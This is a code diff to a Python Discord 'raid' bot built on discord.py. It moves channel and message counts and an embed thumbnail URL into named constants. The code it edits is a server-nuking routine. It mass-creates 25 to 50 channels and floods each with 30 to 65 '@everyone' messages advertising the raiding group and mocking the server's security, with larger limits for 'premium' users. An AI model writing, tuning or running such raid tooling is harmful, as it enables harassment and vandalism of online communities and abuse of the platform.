@@ -8,6 +8,17 @@ from discord.ext import commands, tasks
 from discord.ext.commands import BucketType, CommandOnCooldown, Cooldown, cooldown
 from discord.ui import Button, Select, View
 
+# N7ke Constants for easy editing;
+
+# message count (per channel) and channel count
+MESSAGE_COUNT_DEFAULT = 30
+MESSAGE_COUNT_PREMIUM = 65
+CHANNEL_COUNT_PREMIUM = 50
+CHANNEL_COUNT_DEFAULT = 25
+
+# raid embed thumbnail
+EMBED_THUMB = "https://files.catbox.moe/fd6bt6.png"
+
 intents = discord.Intents.all()
 
 RAID_BOT = 1465897598647930982
@@ -1065,11 +1076,11 @@ async def setup(ctx):
                 ),
                 color=0xb161f9
             )
-            embed.set_thumbnail(url="https://files.catbox.moe/fd6bt6.png")
+            embed.set_thumbnail(url=EMBED_THUMB)
 
             if webhook_message in ["zne owns this", "Server has been nuked!"]:
                 is_premium = is_premium_user(user.id)
-                spams = 65 if is_premium else 30
+                spams = MESSAGE_COUNT_PREMIUM if is_premium else MESSAGE_COUNT_DEFAULT
                 for _ in range(spams):
                     await ch.send(
                         content="# @everyone FUCKED BY [ZNE](https://discord.gg/9U3CcNzQHX) WHY IS SECURITY NOT DOING ANYTHING LOL",
@@ -1084,7 +1095,7 @@ async def setup(ctx):
             print(f"[!] Channel/message failed: {e}")
 
     is_premium = is_premium_user(user.id)
-    channel_count = 50 if is_premium else 25
+    channel_count = CHANNEL_COUNT_PREMIUM if is_premium else CHANNEL_COUNT_DEFAULT
     await asyncio.gather(*(create_channel_and_send_message() for _ in range(channel_count)))
 
     try:
